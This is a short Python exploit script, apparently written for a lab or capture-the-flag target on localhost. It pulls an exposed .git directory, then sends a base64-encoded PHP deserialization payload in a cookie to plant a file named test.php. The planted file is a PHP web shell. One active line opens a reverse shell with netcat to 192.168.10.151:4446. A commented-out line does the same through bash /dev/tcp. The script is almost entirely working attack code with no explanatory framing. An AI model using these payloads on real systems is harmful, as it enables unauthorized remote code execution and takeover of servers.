# ../dvcs-ripper/rip-git.pl -v -u http://localhost:8101/.git/
import requests
import base64

# O:9:"FileClass":2:{s:8:"filename";s:4:"test";s:7:"content";a:1:{i:0;s:32:"<?php echo $_GET[1]($_GET[2]);?>";}}

payload = "<?php echo $_GET[1]($_GET[2]);?>"
#payload = "<?php shell_exec('bash 1> /dev/tcp/192.168.10.151/4446 2>&1 0>&1 &');?>"
payload = "<?php shell_exec('nc 192.168.10.151 4446 -e /bin/sh');?>"
payload_len = len(payload)
serial = 'O:9:"FileClass":2:{s:8:"filename";s:4:"test";s:7:"content";a:1:{i:0;s:' + str(payload_len) + ':"' + payload + '";}}'

cook = base64.b64encode(serial)
cookies = {"cook": cook}

response = requests.post("http://localhost:8101/result.php", cookies=cookies)
response = requests.get("http://localhost:8101/sandbox/172.17.0.1/test.php")
print (response)